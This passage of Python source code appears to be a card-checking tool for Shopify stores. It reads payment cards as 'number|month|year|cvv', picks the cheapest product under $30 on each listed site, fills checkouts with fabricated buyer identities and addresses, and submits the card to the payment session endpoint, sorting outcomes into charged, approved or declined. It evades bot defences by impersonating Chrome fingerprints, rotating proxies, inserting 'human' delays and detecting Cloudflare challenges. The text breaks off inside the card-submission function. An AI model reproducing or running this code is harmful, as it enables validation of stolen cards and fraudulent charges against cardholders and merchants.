import asyncio
import html
import json
import random
import re
import time
import urllib.parse
from dataclasses import dataclass
from enum import Enum
from pathlib import Path
from typing import Dict, List, Tuple

from curl_cffi.requests import AsyncSession


SITE_TXT = Path(__file__).parent / "site.txt"
MAX_SITE_AMOUNT = 30.0
MIN_PRODUCT_PRICE = 0.01
MAX_PRODUCT_PRICE = 30.0

BROWSER_MAP = {
    "chrome131": {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "full_ver": '"Google Chrome";v="131.0.6778.86", "Chromium";v="131.0.6778.86", "Not_A Brand";v="24.0.0.0"',
    },
    "chrome124": {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Google Chrome";v="124", "Chromium";v="124", "Not_A Brand";v="24"',
        "full_ver": '"Google Chrome";v="124.0.6367.91", "Chromium";v="124.0.6367.91", "Not_A Brand";v="24.0.0.0"',
    },
    "chrome120": {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Google Chrome";v="120", "Chromium";v="120", "Not_A Brand";v="24"',
        "full_ver": '"Google Chrome";v="120.0.6099.130", "Chromium";v="120.0.6099.130", "Not_A Brand";v="24.0.0.0"',
    },
}
DEFAULT_BROWSER = "chrome131"


class CheckStatus(Enum):
    CHARGED = 0
    APPROVED = 1
    DECLINED = 2
    ERROR = 3


@dataclass
class CheckResult:
    card: str
    status: CheckStatus
    status_code: str = ""
    amount: str = ""
    currency: str = ""
    site_name: str = ""
    shop_url: str = ""
    receipt_url: str = ""
    paid_site: str = ""
    gateway: str = ""
    error: Exception = None
    retryable: bool = False


@dataclass
class Address:
    first_name: str
    last_name: str
    address1: str
    address2: str
    city: str
    country_code: str
    zone_code: str
    postal_code: str
    phone: str
    email_domain: str = "gmail.com"


COUNTRY_ADDRESSES: Dict[str, Address] = {
    "US": Address("james", "anderson", "428 W 45th St", "Apt 4B", "New York", "US", "NY", "10036", "+12125550100", "gmail.com"),
    "US-CA": Address("michael", "johnson", "123 Hollywood Blvd", "Suite 100", "Los Angeles", "US", "CA", "90028", "+13235550100", "yahoo.com"),
    "US-TX": Address("robert", "williams", "456 Main St", "", "Houston", "US", "TX", "77002", "+17135550100", "outlook.com"),
    "US-FL": Address("david", "brown", "789 Ocean Dr", "Apt 12", "Miami", "US", "FL", "33139", "+13055550100", "hotmail.com"),
    "CA": Address("john", "smith", "200 Kent St", "", "Ottawa", "CA", "ON", "K1A 0G9", "+16135550100", "gmail.com"),
    "CA-BC": Address("william", "davis", "789 Granville St", "Floor 5", "Vancouver", "CA", "BC", "V6Z 1K9", "+16045550100", "gmail.com"),
    "MX": Address("carlos", "lopez", "Av. Reforma 100", "", "Mexico City", "MX", "CMX", "06000", "+525512345678", "gmail.com"),
    "GB": Address("james", "wilson", "10 Downing St", "", "London", "GB", "ENG", "SW1A 2AA", "+442012345678", "gmail.com"),
    "GB-MAN": Address("oliver", "martinez", "123 Deansgate", "Apt 3B", "Manchester", "GB", "ENG", "M3 4BQ", "+441619876543", "outlook.com"),
    "DE": Address("lucas", "thomas", "Friedrichstr 100", "", "Berlin", "DE", "BE", "10117", "+493012345678", "gmail.com"),
    "DE-MUC": Address("felix", "schmidt", "Marienplatz 1", "", "Munich", "DE", "BY", "80331", "+49891234567", "gmail.com"),
    "FR": Address("hugo", "bernard", "10 Rue de Rivoli", "", "Paris", "FR", "IDF", "75001", "+33112345678", "gmail.com"),
    "FR-LY": Address("louis", "petit", "15 Rue de la République", "", "Lyon", "FR", "ARA", "69001", "+33487654321", "outlook.com"),
    "IT": Address("marco", "rossi", "Via Roma 1", "", "Rome", "IT", "RM", "00184", "+39061234567", "gmail.com"),
    "ES": Address("carlos", "garcia", "Calle Mayor 1", "", "Madrid", "ES", "M", "28013", "+34912345678", "gmail.com"),
    "NL": Address("bas", "jansen", "Dam 1", "", "Amsterdam", "NL", "NH", "1012 JS", "+31201234567", "gmail.com"),
    "BE": Address("jan", "peeters", "Grote Markt 1", "", "Brussels", "BE", "BRU", "1000", "+3221234567", "gmail.com"),
    "CH": Address("hans", "weber", "Bahnhofstrasse 1", "", "Zurich", "CH", "ZH", "8001", "+41441234567", "gmail.com"),
    "AT": Address("markus", "gruber", "Stephansplatz 1", "", "Vienna", "AT", "9", "1010", "+4312345678", "gmail.com"),
    "SE": Address("erik", "andersson", "Vasagatan 1", "", "Stockholm", "SE", "AB", "111 20", "+468123456", "gmail.com"),
    "NO": Address("olav", "hansen", "Karl Johans gate 1", "", "Oslo", "NO", "03", "0154", "+4721234567", "gmail.com"),
    "DK": Address("lars", "nielsen", "Strøget 1", "", "Copenhagen", "DK", "84", "1457", "+4531234567", "gmail.com"),
    "FI": Address("jussi", "korhonen", "Mannerheimintie 1", "", "Helsinki", "FI", "18", "00100", "+35891234567", "gmail.com"),
    "IE": Address("sean", "murphy", "1 Grafton St", "", "Dublin", "IE", "D", "D02 Y006", "+35311234567", "gmail.com"),
    "PT": Address("joao", "silva", "Rua Augusta 1", "", "Lisbon", "PT", "LIS", "1100-053", "+351211234567", "gmail.com"),
    "GR": Address("nikos", "papadopoulos", "Ermou 1", "", "Athens", "GR", "I", "10563", "+302101234567", "gmail.com"),
    "PL": Address("piotr", "kowalski", "Nowy Swiat 1", "", "Warsaw", "PL", "MZ", "00-001", "+48221234567", "gmail.com"),
    "CZ": Address("jan", "novak", "Vaclavske namesti 1", "", "Prague", "CZ", "PR", "110 00", "+420212345678", "gmail.com"),
    "AU": Address("thomas", "taylor", "1 George St", "", "Sydney", "AU", "NSW", "2000", "+61212345678", "gmail.com"),
    "AU-MEL": Address("daniel", "anderson", "100 Collins St", "Level 10", "Melbourne", "AU", "VIC", "3000", "+61398765432", "yahoo.com"),
    "NZ": Address("jack", "wilson", "1 Queen St", "", "Auckland", "NZ", "AUK", "1010", "+6491234567", "gmail.com"),
    "IN": Address("rohan", "singh", "Sachin Sweets Corner Nandgram Ghukna", "", "Ghaziabad", "IN", "UP", "201003", "8826800450", "gmail.com"),
    "JP": Address("takashi", "yamamoto", "1-1-1 Marunouchi", "", "Tokyo", "JP", "13", "100-0005", "+81312345678", "gmail.com"),
    "SG": Address("wei", "tan", "1 Raffles Place", "#01-01", "Singapore", "SG", "01", "048616", "+6561234567", "gmail.com"),
    "AE": Address("ahmed", "al-mansouri", "Sheikh Zayed Road 1", "", "Dubai", "AE", "DU", "12345", "+97141234567", "gmail.com"),
    "SA": Address("mohammed", "al-ahmed", "King Fahd Road 1", "", "Riyadh", "SA", "01", "11564", "+966112345678", "gmail.com"),
    "IL": Address("david", "cohen", "Rothschild Blvd 1", "", "Tel Aviv", "IL", "TA", "6688101", "+97231234567", "gmail.com"),
    "TR": Address("mehmet", "yilmaz", "Istiklal Caddesi 1", "", "Istanbul", "TR", "34", "34000", "+902121234567", "gmail.com"),
    "BR": Address("joao", "santos", "Av. Paulista 1000", "", "Sao Paulo", "BR", "SP", "01310-100", "+551112345678", "gmail.com"),
    "AR": Address("juan", "garcia", "Av. Corrientes 1000", "", "Buenos Aires", "AR", "C", "C1043", "+541112345678", "gmail.com"),
    "CL": Address("pedro", "gonzalez", "Av. Providencia 1000", "", "Santiago", "CL", "RM", "7500000", "+562212345678", "gmail.com"),
    "CO": Address("andres", "rodriguez", "Carrera 7 # 100", "", "Bogota", "CO", "DC", "110111", "+5711234567", "gmail.com"),
}

SHIPPING_FALLBACK_ORDER = [
    "US", "CA", "GB", "AU", "DE", "FR", "IT", "ES", "NL", "BE",
    "CH", "AT", "SE", "NO", "DK", "FI", "IE", "PT", "NZ", "JP",
    "SG", "AE", "IN", "BR", "MX", "PL", "CZ", "GR", "TR", "IL",
]

EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com", "icloud.com", "aol.com", "mail.com", "yandex.com", "proton.me"]
FIRST_NAMES = ["james", "john", "robert", "michael", "william", "david", "richard", "joseph", "thomas", "charles", "mary", "patricia", "jennifer", "linda", "elizabeth", "barbara", "susan", "jessica", "sarah", "karen"]
LAST_NAMES = ["smith", "johnson", "williams", "brown", "jones", "garcia", "miller", "davis", "rodriguez", "martinez", "anderson", "taylor", "thomas", "moore", "jackson", "martin", "lee", "white", "harris", "clark"]

FALLBACK_POLL_ID = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"


def generate_random_email() -> str:
    name = random.choice(FIRST_NAMES) + random.choice(LAST_NAMES) + str(random.randint(1, 999))
    return f"{name}@{random.choice(EMAIL_DOMAINS)}"


def address_for_country(country: str) -> Address:
    if country in COUNTRY_ADDRESSES:
        return COUNTRY_ADDRESSES[country]
    base = country[:2] if len(country) > 2 else country
    if base in COUNTRY_ADDRESSES:
        return COUNTRY_ADDRESSES[base]
    return random.choice(list(COUNTRY_ADDRESSES.values()))


def get_fallback_addresses(exclude_country: str = "US") -> List[Address]:
    result = []
    for code in SHIPPING_FALLBACK_ORDER:
        if code.upper() != exclude_country.upper() and code in COUNTRY_ADDRESSES:
            result.append(COUNTRY_ADDRESSES[code])
    return result


def normalize_proxy(raw: str) -> str:
    p = (raw or "").strip()
    if not p:
        return ""
    if '://' not in p:
        parts = p.split(':')
        if len(parts) == 4:
            p = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        else:
            p = "http://" + p
    parsed = urllib.parse.urlparse(p)
    if not parsed.netloc:
        raise Exception(f"invalid proxy format: {raw}")
    return p


def parse_card_entry(card_entry: str) -> Tuple[str, int, int, str]:
    card_parts = card_entry.strip().split('|')
    if len(card_parts) != 4:
        raise Exception(f"invalid card format: {card_entry}")
    try:
        card_month = int(card_parts[1])
        card_year = int(card_parts[2])
    except ValueError:
        raise Exception(f"invalid card month/year: {card_entry}")
    return card_parts[0], card_month, card_year, card_parts[3]


def load_sites_from_file(path: Path) -> List[str]:
    with open(path, "r", encoding="utf-8") as f:
        lines = f.read().splitlines()
    sites = []
    for raw in lines:
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        if not line.startswith(("http://", "https://")):
            line = "https://" + line
        sites.append(line.rstrip("/"))
    if not sites:
        raise Exception("site.txt empty")
    return sites


async def _human_delay(min_ms: int = 150, max_ms: int = 600) -> None:
    await asyncio.sleep(random.randint(min_ms, max_ms) / 1000.0)


class AsyncTLSClient:
    def __init__(self, timeout=20, proxy_url=None, browser=None):
        self.timeout = timeout
        self.proxy_url = proxy_url
        self.browser = browser or DEFAULT_BROWSER
        b = BROWSER_MAP[self.browser]
        self.impersonate = self.browser
        self.user_agent = b["ua"]
        self.sec_ch_ua = b["sec_ch_ua"]
        self.sec_ch_ua_full = b["full_ver"]
        self._session = None

    def _make_session(self):
        s = AsyncSession(impersonate=self.impersonate, timeout=self.timeout)
        s.headers.update({
            'User-Agent': self.user_agent,
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
            'sec-ch-ua': self.sec_ch_ua,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-full-version-list': self.sec_ch_ua_full,
            'DNT': '1',
            'Sec-GPC': '1',
        })
        if self.proxy_url:
            s.proxies = {'http': self.proxy_url, 'https': self.proxy_url}
        return s

    async def __aenter__(self):
        self._session = self._make_session()
        return self

    async def __aexit__(self, *args):
        await self.close()

    async def get(self, url, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        if self._session is None:
            self._session = self._make_session()
        return await self._session.get(url, **kwargs)

    async def post(self, url, data=None, json=None, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        if self._session is None:
            self._session = self._make_session()
        return await self._session.post(url, data=data, json=json, **kwargs)

    async def close(self):
        if self._session is not None:
            await self._session.close()
            self._session = None


def extract_stable_id(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    m = re.search(r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"', unescaped)
    return m.group(1) if m else ""


def extract_commit_sha(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    m = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
    return m.group(1) if m else ""


def extract_source_token(checkout_html: str) -> str:
    m = re.search(r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"', checkout_html)
    return html.unescape(m.group(1)).strip('"') if m else ""


def extract_private_access_token_id(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    m = re.search(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"', unescaped)
    return m.group(1) if m else ""


def extract_identification_signature(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    m = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
    return m.group(1) if m else ""


def extract_pci_session_id(pci_body: str) -> str:
    try:
        data = json.loads(pci_body)
        v = data.get("id")
        if isinstance(v, str) and v:
            return v
    except Exception:
        pass
    m = re.search(r'"id"\s*:\s*"([^"]+)"', pci_body)
    return m.group(1) if m else ""


def extract_queue_token(proposal_json: str) -> str:
    m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', proposal_json)
    return m.group(1) if m else ""


def extract_is_shipping_required(proposal_json: str) -> bool:
    try:
        data = json.loads(proposal_json)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal", {}))
        return bool(seller.get("isShippingRequired", True))
    except Exception:
        return True


def extract_delivery_handle(proposal_body: str) -> str:
    patterns = [
        r'"selectedDeliveryStrategy"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"\s*,\s*"__typename"\s*:\s*"CompleteDeliveryStrategy"',
        r'"selectedDeliveryStrategy"\s*:\s*\{[^{}]*?"handle"\s*:\s*"([^"]+)"',
        r'"deliveryStrategyByHandle"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"',
        r'"deliveryHandle"\s*:\s*"([^"]+)"',
    ]
    for p in patterns:
        m = re.search(p, proposal_body)
        if m and m.group(1) and len(m.group(1)) >= 15:
            return m.group(1)
    try:
        data = json.loads(proposal_body)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal", {}))
        for line in seller.get("delivery", {}).get("deliveryLines", []) or []:
            sds = line.get("selectedDeliveryStrategy") or {}
            for key in ("handle", "signedHandle"):
                v = sds.get(key)
                if isinstance(v, str) and len(v) >= 15:
                    return v
            dsbh = sds.get("deliveryStrategyByHandle") or {}
            v = dsbh.get("handle")
            if isinstance(v, str) and len(v) >= 15:
                return v
            v = line.get("deliveryHandle")
            if isinstance(v, str) and len(v) >= 15:
                return v
        de = seller.get("deliveryExpectations") or {}
        for exp in de.get("deliveryExpectations", []) or []:
            if isinstance(exp, dict):
                v = exp.get("signedHandle") or exp.get("handle")
                if isinstance(v, str) and len(v) >= 15:
                    return v
    except Exception:
        pass
    return ""


def extract_signed_handles(proposal_json: str) -> List[str]:
    try:
        data = json.loads(proposal_json)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal", {}))
        de = seller.get("deliveryExpectations") or {}
        typename = de.get("__typename", "")
        if typename in ("UnfilledDeliveryExpectationTerms", "UnavailableTerms", "PendingTerms"):
            return []
        exps = de.get("deliveryExpectations")
        if isinstance(exps, list):
            handles = [x.get("signedHandle") for x in exps if isinstance(x, dict) and x.get("signedHandle")]
            if handles:
                return handles
    except Exception:
        pass
    return []


def extract_shipping_amount(proposal_body: str) -> str:
    m = re.search(r'"deliveryStrategyBreakdown"\s*:\s*\[\s*\{\s*"amount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return m.group(1) if m else ""


def extract_checkout_total(proposal_body: str) -> str:
    m = re.search(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return m.group(1) if m else ""


def extract_seller_total(proposal_body: str) -> str:
    m = re.search(r'"total"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return m.group(1) if m else ""


def extract_running_total(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        val = (data.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal", {}).get("runningTotal", {}).get("value", {}))
        return val.get("amount", "")
    except Exception:
        return ""


def extract_seller_merchandise_price(proposal_body: str) -> str:
    m = re.search(r'"ContextualizedProductVariantMerchandise".*?"totalAmount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return m.group(1) if m else ""


def extract_seller_currency(proposal_body: str) -> str:
    m = re.search(r'"supportedCurrencies"\s*:\s*\["([^"]+)"', proposal_body)
    return m.group(1) if m else ""


def extract_seller_country(proposal_body: str) -> str:
    m = re.search(r'"supportedCountries"\s*:\s*\["([^"]+)"', proposal_body)
    return m.group(1) if m else ""


def extract_tax_amount(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        val = (data.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal", {}).get("tax", {}).get("totalTaxAmount", {}).get("value", {}))
        return val.get("amount", "0.0")
    except Exception:
        return "0.0"


def extract_tax_from_rejected(submit_json: str) -> str:
    try:
        data = json.loads(submit_json)
        seller = (data.get("data", {}).get("submitForCompletion", {}).get("sellerProposal", {}))
        return seller.get("tax", {}).get("totalTaxAmount", {}).get("value", {}).get("amount", "0.0")
    except Exception:
        return "0.0"


def extract_total_from_rejected(submit_json: str) -> str:
    try:
        data = json.loads(submit_json)
        seller = (data.get("data", {}).get("submitForCompletion", {}).get("sellerProposal", {}))
        for key in ("checkoutTotal", "total", "runningTotal"):
            val = seller.get(key, {}).get("value", {}).get("amount")
            if val:
                return val
        return ""
    except Exception:
        return ""


def extract_receipt_id(submit_body: str) -> str:
    m = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', submit_body)
    return m.group(1) if m else ""


def extract_receipt_session_token(submit_body: str) -> str:
    m = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', submit_body)
    return m.group(1) if m else ""


def extract_payment_gateways(proposal_body: str) -> List[dict]:
    try:
        seller = (json.loads(proposal_body).get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal", {}))
    except Exception:
        return []
    lines = (seller.get("payment") or {}).get("availablePaymentLines") or []
    out, seen = [], set()
    for line in lines:
        pm = line.get("paymentMethod") or {}
        if not pm:
            continue
        entry = {
            "typename": pm.get("__typename", ""),
            "name": pm.get("name", ""),
            "display": pm.get("extensibilityDisplayName") or pm.get("displayName") or pm.get("name", ""),
            "id": pm.get("paymentMethodIdentifier", ""),
        }
        k = (entry["typename"], entry["name"], entry["id"])
        if k in seen:
            continue
        seen.add(k)
        out.append(entry)
    return out


def extract_receipt_url(poll_body: str, shop_url: str = "") -> str:
    try:
        poll_json = json.loads(poll_body)
        receipt = poll_json.get("data", {}).get("receipt", {})
        for key in ("confirmationPage",):
            v = receipt.get(key) or {}
            u = v.get("url", "") if isinstance(v, dict) else ""
            if u.startswith("http"):
                return u
        for key in ("confirmationPageUrl",):
            u = receipt.get(key, "")
            if u and u.startswith("http"):
                return u
        order = receipt.get("order") or {}
        for key in ("confirmationPageUrl", "orderStatusPageUrl", "orderStatusUrl"):
            u = order.get(key, "")
            if u and u.startswith("http"):
                return u
        rid = receipt.get("id", "")
        if rid and "gid://shopify/" in rid:
            num = rid.rstrip("/").split("/")[-1]
            if num.isdigit() and shop_url:
                return f"{shop_url.rstrip('/')}/orders/{num}"
        for pat in [
            r'"confirmationPage"\s*:\s*\{[^}]*"url"\s*:\s*"(https?://[^"]+)"',
            r'"confirmationPageUrl"\s*:\s*"(https?://[^"]+)"',
            r'"orderStatusPageUrl"\s*:\s*"(https?://[^"]+)"',
            r'"orderStatusUrl"\s*:\s*"(https?://[^"]+)"',
            r'"thankYouUrl"\s*:\s*"(https?://[^"]+)"',
            r'"receiptUrl"\s*:\s*"(https?://[^"]+)"',
        ]:
            m = re.search(pat, poll_body)
            if m:
                return m.group(1)
    except Exception:
        pass
    return ""


def extract_any_error(submit_body: str) -> str:
    for pat in [
        r'"nonLocalizedMessage"\s*:\s*"([^"]+)"',
        r'"localizedMessage"\s*:\s*"([^"]+)"',
        r'"code"\s*:\s*"([^"]+)"',
        r'"message"\s*:\s*"([^"]+)"',
    ]:
        m = re.search(pat, submit_body)
        if m:
            return m.group(1)
    return ""


def extract_receipt_status_code(poll_body: str, receipt_type: str) -> str:
    if receipt_type in ("SuccessfulReceipt", "ProcessedReceipt"):
        return "ORDER_PLACED"
    if receipt_type == "ProcessingReceipt":
        return "PROCESSING"
    m = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
    if m:
        code = m.group(1)
        return "CARD_DECLINED" if "CAPTCHA" in code else code
    if "CAPTCHA" in poll_body:
        return "CARD_DECLINED"
    if receipt_type == "FailedReceipt":
        return "FAILED"
    return "UNKNOWN"


def detect_shipping_restriction(proposal_body: str) -> bool:
    signals = ("SHIPPING_ADDRESS_UNDELIVERABLE", "no_delivery_options_available",
               "noDeliveryOptionsAvailable", "delivery is not available", "does not ship to")
    lower = proposal_body.lower()
    return any(s.lower() in lower for s in signals)


def patch_payload(payload: str, currency: str, country: str) -> str:
    if currency != "USD":
        payload = payload.replace('"currencyCode": "USD"', f'"currencyCode": "{currency}"')
        payload = payload.replace('"presentmentCurrency": "USD"', f'"presentmentCurrency": "{currency}"')
    if country != "US":
        payload = payload.replace(
            '"presentmentCurrency": "USD",\n      "countryCode": "US"',
            f'"presentmentCurrency": "USD",\n      "countryCode": "{country}"'
        )
        payload = payload.replace('"phoneCountryCode": "US"', f'"phoneCountryCode": "{country}"')
    return payload


def generate_attempt_token(checkout_token: str) -> str:
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    return f"{checkout_token}-{''.join(random.choice(chars) for _ in range(10))}"


def generate_page_id() -> str:
    return f"{random.getrandbits(64):016x}"


def extract_all_checkout_js_urls(checkout_html: str, shop_url: str) -> List[str]:
    if not checkout_html:
        return []
    matches = re.findall(
        r'(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_\-/]+\.[A-Za-z0-9_\-]+\.js)',
        checkout_html
    )
    seen, urls = set(), []
    for m in matches:
        if m not in seen:
            seen.add(m)
            urls.append(shop_url + m)
    return urls


def extract_ids_from_js(js_body: str) -> Tuple[str, str, str]:
    if not js_body:
        return "", "", ""
    pid = sid = poll = ""
    m = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js_body)
    if m:
        pid = m.group(1)
    m = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js_body)
    if m:
        sid = m.group(1)
    for pat in [
        r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"',
        r'name:\s*"PollForReceipt"[^}]{0,300}?id:\s*"([a-f0-9]{64})"',
        r'PollForReceipt.{0,300}?([a-f0-9]{64})',
    ]:
        m = re.search(pat, js_body)
        if m:
            poll = m.group(1)
            break
    return pid, sid, poll


async def _fetch_products_page(client: AsyncTLSClient, shop_url: str, page: int = 1) -> list:
    resp = await client.get(
        f"{shop_url}/products.json?sort_by=price-ascending&limit=250&page={page}"
    )
    if resp.status_code == 429:
        raise Exception("products.json 429 rate limit")
    if resp.status_code == 503:
        raise Exception("products.json 503")
    if resp.status_code != 200:
        body = resp.text[:200].lower()
        if "cloudflare" in body or "1003" in body:
            raise Exception("cloudflare block")
        raise Exception(f"products.json returned {resp.status_code}")
    try:
        return resp.json().get("products", [])
    except Exception:
        raise Exception("products.json invalid JSON")


def _best_entry(products: list, min_price: float, max_price: float):
    best = None
    best_price = float("inf")
    for p in products:
        for v in p.get("variants", []):
            if not v.get("available", False):
                continue
            try:
                price = float(v.get("price") or 0)
            except (ValueError, TypeError):
                continue
            if price < min_price or price > max_price:
                continue
            if price < best_price:
                best_price = price
                best = (p.get("title", ""), str(p.get("id", "")),
                        p.get("handle", ""), str(v.get("id", "")), v.get("price", ""))
    return best


async def find_cheapest_product(client: AsyncTLSClient, shop_url: str,
                                min_price: float = MIN_PRODUCT_PRICE,
                                max_price: float = MAX_PRODUCT_PRICE):
    all_products = []
    for page in range(1, 6):
        try:
            products = await _fetch_products_page(client, shop_url, page)
        except Exception:
            if all_products:
                break
            raise
        if not products:
            break
        all_products.extend(products)
        if len(products) < 250:
            break
    if not all_products:
        raise Exception(f"products.json empty at {shop_url}")
    best = _best_entry(all_products, min_price, max_price)
    if best:
        return best
    raise Exception(f"no products ${min_price}-${max_price} at {shop_url}")


async def add_to_cart_and_checkout(client: AsyncTLSClient, shop_url: str, variant_id: str):
    try:
        await client.get(shop_url, allow_redirects=True, timeout=10)
        await _human_delay(120, 350)
    except Exception:
        pass

    cart_permalink = f"{shop_url}/cart/{variant_id}:1"
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "referer": shop_url + "/",
        "sec-ch-ua": client.sec_ch_ua,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-ch-ua-full-version-list": client.sec_ch_ua_full,
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
    }
    checkout_resp = await client.get(cart_permalink, allow_redirects=True, headers=headers)
    checkout_url = checkout_resp.url
    checkout_html = checkout_resp.text
    if checkout_resp.status_code not in (200, 302):
        raise Exception(f"cart permalink returned {checkout_resp.status_code}")
    if "cf-chl" in checkout_html[:5000] or "Just a moment" in checkout_html[:2000]:
        raise Exception("CF_MANAGED_CHALLENGE")
    tm = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
    checkout_token = tm.group(1) if tm else ""
    sm = re.search(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"', checkout_html)
    session_token = html.unescape(sm.group(1)).strip('"') if sm else ""
    return checkout_url, checkout_token, session_token, checkout_html


async def fetch_private_access_token(client: AsyncTLSClient, shop_url: str, checkout_url: str, pat_id: str) -> str:
    req_url = f"{shop_url}/private_access_tokens?id={urllib.parse.quote(pat_id)}&checkout_type=c1"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "referer": checkout_url,
        "sec-ch-ua": client.sec_ch_ua,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-ch-ua-full-version-list": client.sec_ch_ua_full,
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
    }
    resp = await client.get(req_url, headers=headers)
    return f"[{resp.status_code}] {resp.text}"


async def fetch_actions_js(client: AsyncTLSClient, js_url: str, shop_url: str) -> str:
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "origin": shop_url,
        "priority": "u=1",
        "referer": shop_url + "/",
        "sec-ch-ua": client.sec_ch_ua,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-ch-ua-full-version-list": client.sec_ch_ua_full,
        "sec-fetch-dest": "script",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
    }
    resp = await client.get(js_url, headers=headers)
    if resp.status_code != 200:
        raise Exception(f"GET js returned {resp.status_code}")
    return resp.text


def _proposal_headers(client: AsyncTLSClient, shop_url: str, checkout_url: str,
                      checkout_token: str, session_token: str, build_id: str,
                      source_token: str) -> Dict:
    return {
        "accept": "application/json",
        "accept-language": "en-US",
        "content-type": "application/json",
        "origin": shop_url,
        "priority": "u=1, i",
        "referer": checkout_url,
        "sec-ch-ua": client.sec_ch_ua,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-ch-ua-full-version-list": client.sec_ch_ua_full,
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "shopify-checkout-client": "checkout-web/1.0",
        "shopify-checkout-source": f'id="{checkout_token}", type="cn"',
        "x-checkout-one-session-token": session_token,
        "x-checkout-web-build-id": build_id,
        "x-checkout-web-deploy-stage": "production",
        "x-checkout-web-server-handling": "fast",
        "x-checkout-web-server-rendering": "yes",
        "x-checkout-web-source-id": source_token,
    }


async def send_pci_session(client: AsyncTLSClient, ident_sig: str, card_number: str,
                           card_name: str, card_month: int, card_year: int, cvv: str,
                           shop_domain: str, proxy_url: str = ""):
    payload = json.dumps({
        "credit_card": {
            "number": card_number,
            "month": card_month,
            "year": card_year,
